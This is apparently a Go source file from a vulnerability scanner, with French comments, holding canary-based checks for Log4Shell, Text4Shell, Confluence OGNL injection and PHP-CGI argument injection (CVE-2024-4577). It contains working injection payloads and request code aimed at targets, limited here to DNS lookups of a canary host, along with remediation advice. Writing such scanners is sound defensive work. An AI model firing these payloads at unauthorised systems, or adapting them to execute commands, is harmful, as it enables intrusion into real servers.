package checks

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
)

func init() {
	register(log4shell{})
	register(text4shell{})
	register(confluenceOGNL{})
	register(phpCGI{})
}

// origin renvoie schéma://hôte[:port] d'une URL cible.
func origin(target string) string {
	u, err := url.Parse(target)
	if err != nil {
		return target
	}
	return u.Scheme + "://" + u.Host
}

// withQuery ajoute des paramètres à l'URL cible en conservant ceux déjà présents.
func withQuery(target string, q url.Values) string {
	u, err := url.Parse(target)
	if err != nil {
		return target
	}
	cur := u.Query()
	for k, vs := range q {
		cur[k] = vs
	}
	u.RawQuery = cur.Encode()
	return u.String()
}

// injectAll envoie une requête GET (en-têtes + paramètres) puis une requête POST (formulaire),
// chaque emplacement recevant son propre nom de canari pour savoir lequel a été évalué.
func injectAll(ctx context.Context, target string, env Env, headers, params, form []string, payload func(host string) string) []Point {
	var points []Point
	n := 0
	next := func() string { n++; return fmt.Sprintf("p%d", n) }

	q := url.Values{}
	req, err := http.NewRequest(http.MethodGet, target, nil)
	if err != nil {
		return []Point{{ID: "p0", Location: target, Error: errText(err)}}
	}
	for _, h := range headers {
		id := next()
		v := payload(env.CanaryHost(id))
		if h == "Authorization" {
			v = "Bearer " + v
		}
		req.Header.Set(h, v)
		points = append(points, Point{ID: id, Location: "en-tête " + h})
	}
	for _, p := range params {
		id := next()
		q.Set(p, payload(env.CanaryHost(id)))
		points = append(points, Point{ID: id, Location: "paramètre GET " + p})
	}
	req.URL, _ = url.Parse(withQuery(target, q))
	resp, _, err := send(ctx, env.Client, req)
	for i := range points {
		if err != nil {
			points[i].Error = errText(err)
		} else {
			points[i].Status = resp.StatusCode
		}
	}

	if len(form) > 0 {
		f := url.Values{}
		start := len(points)
		for _, p := range form {
			id := next()
			f.Set(p, payload(env.CanaryHost(id)))
			points = append(points, Point{ID: id, Location: "champ POST " + p})
		}
		preq, _ := http.NewRequest(http.MethodPost, target, strings.NewReader(f.Encode()))
		preq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, _, err := send(ctx, env.Client, preq)
		for i := start; i < len(points); i++ {
			if err != nil {
				points[i].Error = errText(err)
			} else {
				points[i].Status = resp.StatusCode
			}
		}
	}
	return points
}

func canaryOutcome(points []Point, what string) (Outcome, error) {
	if !anySent(points) {
		return Outcome{Points: points}, fmt.Errorf("aucune requête n'a pu être envoyée : %s", points[0].Error)
	}
	return Outcome{Summary: what, Points: points}, nil
}

// ---------------------------------------------------------------------------------------------

type log4shell struct{}

func (log4shell) Info() Info {
	return Info{
		ID: "log4shell", Name: "Log4JChecker", CVEs: []string{"CVE-2021-44228", "CVE-2021-45046"},
		Product: "Apache Log4j 2 (2.0-beta9 à 2.15.0)", Mode: ModeCanary, Tags: []string{"java", "log4j"},
		Description: "Place une chaîne de lookup JNDI pointant vers le canari dans les en-têtes, les paramètres et un formulaire. Une application qui journalise ces valeurs avec une version vulnérable de Log4j résout le nom du canari.",
		Proof:       "Requête DNS sur le canari (lookup JNDI)",
		Sent:        "${jndi:ldap://<point>.<canari>/a} : le nom est résolu, mais le récepteur n'expose aucun service LDAP, donc aucune classe Java n'est chargée ni exécutée.",
		Remediation: []string{"Mettre Log4j à jour en 2.17.1 ou plus (2.12.4 pour Java 7, 2.3.2 pour Java 6).", "Bloquer les sorties LDAP, RMI et DNS non nécessaires depuis ce serveur.", "Rechercher des traces d'exploitation antérieure (chaînes ${jndi:} dans les journaux).", "Relancer le check pour confirmer la correction."},
		References:  []string{"https://logging.apache.org/log4j/2.x/security.html", "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"},
		LabNote:     "À valider contre vulhub/solr:8.11.0 (lab/compose.yaml).",
	}
}

func (log4shell) Run(ctx context.Context, target string, env Env) (Outcome, error) {
	payload := func(h string) string { return "${jndi:ldap://" + h + "/a}" }
	pts := injectAll(ctx, target, env,
		[]string{"User-Agent", "X-Api-Version", "Referer", "X-Forwarded-For", "Authorization", "X-Request-Id"},
		[]string{"q", "action", "id", "search"},
		[]string{"username", "search"},
		payload)
	return canaryOutcome(pts, "Lookup JNDI injecté dans les en-têtes, paramètres et champs de formulaire.")
}

// ---------------------------------------------------------------------------------------------

type text4shell struct{}

func (text4shell) Info() Info {
	return Info{
		ID: "text4shell", Name: "Text4ShellChecker", CVEs: []string{"CVE-2022-42889"},
		Product: "Apache Commons Text 1.5 à 1.9", Mode: ModeCanary, Tags: []string{"java"},
		Description: "Injecte une interpolation ${dns:…} dans les paramètres et un formulaire. Une application qui passe ces valeurs à StringSubstitutor avec une version vulnérable résout le canari.",
		Proof:       "Requête DNS sur le canari",
		Sent:        "${dns:address|<point>.<canari>} : uniquement une résolution de nom, aucune autre action sur la cible.",
		Remediation: []string{"Mettre Commons Text à jour en 1.10.0 ou plus.", "Ne jamais interpoler des données externes avec StringSubstitutor.createInterpolator().", "Relancer le check pour confirmer la correction."},
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-42889"},
		LabNote:     "À valider contre l'application de test lab/text4shell (commons-text 1.9).",
	}
}

func (text4shell) Run(ctx context.Context, target string, env Env) (Outcome, error) {
	payload := func(h string) string { return "${dns:address|" + h + "}" }
	pts := injectAll(ctx, target, env,
		[]string{"User-Agent"},
		[]string{"q", "search", "id", "name", "text"},
		[]string{"q", "text"},
		payload)
	return canaryOutcome(pts, "Interpolation ${dns:} injectée dans les paramètres et champs de formulaire.")
}

// ---------------------------------------------------------------------------------------------

type confluenceOGNL struct{}

func (confluenceOGNL) Info() Info {
	return Info{
		ID: "confluence-ognl", Name: "ConfluenceChecker", CVEs: []string{"CVE-2022-26134"},
		Product: "Atlassian Confluence Server / Data Center (avant 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1)", Mode: ModeCanary, Tags: []string{"confluence", "java"},
		Description: "Place dans l'URL une expression OGNL qui se borne à résoudre le nom du canari (InetAddress.getByName).",
		Proof:       "Requête DNS sur le canari",
		Sent:        "/${(#a=@java.net.InetAddress@getByName(\"<canari>\"))}/ : aucune commande système n'est appelée.",
		Remediation: []string{"Mettre Confluence à jour vers une version corrigée (7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1 ou plus).", "Rechercher des fichiers JSP ou des processus inattendus créés depuis juin 2022.", "Relancer le check pour confirmer la correction."},
		References:  []string{"https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"},
		LabNote:     "À valider en labo : l'image Confluence demande une licence d'évaluation.",
	}
}

func (confluenceOGNL) Run(ctx context.Context, target string, env Env) (Outcome, error) {
	expr := `${(#a=@java.net.InetAddress@getByName("` + env.CanaryHost("p1") + `"))}`
	u := strings.TrimRight(target, "/") + "/" + url.PathEscape(expr) + "/"
	req, err := http.NewRequest(http.MethodGet, u, nil)
	if err != nil {
		return Outcome{}, err
	}
	pt := Point{ID: "p1", Location: "chemin de l'URL (espace de noms OGNL)"}
	resp, _, err := send(ctx, env.Client, req)
	if err != nil {
		pt.Error = errText(err)
	} else {
		pt.Status = resp.StatusCode
	}
	return canaryOutcome([]Point{pt}, "Expression OGNL de résolution DNS placée dans le chemin.")
}

// ---------------------------------------------------------------------------------------------

type phpCGI struct{}

func (phpCGI) Info() Info {
	return Info{
		ID: "php-cgi-4577", Name: "PHPCGIChecker", CVEs: []string{"CVE-2024-4577"},
		Product: "PHP en mode CGI sous Windows (avant 8.1.29, 8.2.20, 8.3.8)", Mode: ModeCanary, Tags: []string{"php", "windows"},
		Description: "Exploite l'injection d'arguments PHP-CGI (tiret doux U+00AD converti en tiret par Windows) pour exécuter une seule instruction : la résolution DNS du canari.",
		Proof:       "Résolution DNS du canari par PHP (gethostbyname)",
		Sent:        "POST ?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input avec le corps <?php gethostbyname('<canari>'); ?> : aucune commande, aucun fichier écrit.",
		Remediation: []string{"Mettre PHP à jour (8.1.29, 8.2.20, 8.3.8 ou plus).", "Abandonner PHP-CGI au profit de PHP-FPM ou mod_php.", "Sur XAMPP, commenter la ligne ScriptAlias /php-cgi/ dans httpd-xampp.conf.", "Relancer le check pour confirmer la correction."},
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-4577", "https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv"},
		LabNote:     "À valider sur une VM Windows (la faille dépend des pages de code Windows, pas de cible Docker Linux).",
	}
}

func (phpCGI) Run(ctx context.Context, target string, env Env) (Outcome, error) {
	const inj = "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp%3a//input"
	paths := []struct{ id, loc, url string }{
		{"p1", "/php-cgi/php-cgi.exe", joinURL(origin(target), "php-cgi/php-cgi.exe") + inj},
	}
	idx := target
	if u, err := url.Parse(target); err == nil {
		if !strings.HasSuffix(u.Path, ".php") {
			idx = joinURL(origin(target), "index.php")
		} else {
			u.RawQuery = ""
			idx = u.String()
		}
	}
	paths = append(paths, struct{ id, loc, url string }{"p2", "script PHP (" + idx + ")", idx + inj})
	var pts []Point
	for _, p := range paths {
		body := "<?php gethostbyname('" + env.CanaryHost(p.id) + "'); ?>"
		req, err := http.NewRequest(http.MethodPost, p.url, strings.NewReader(body))
		pt := Point{ID: p.id, Location: p.loc}
		if err != nil {
			pt.Error = errText(err)
			pts = append(pts, pt)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, _, err := send(ctx, env.Client, req)
		if err != nil {
			pt.Error = errText(err)
		} else {
			pt.Status = resp.StatusCode
		}
		pts = append(pts, pt)
	}
	return canaryOutcome(pts, "Injection d'arguments PHP-CGI limitée à une résolution DNS.")
}
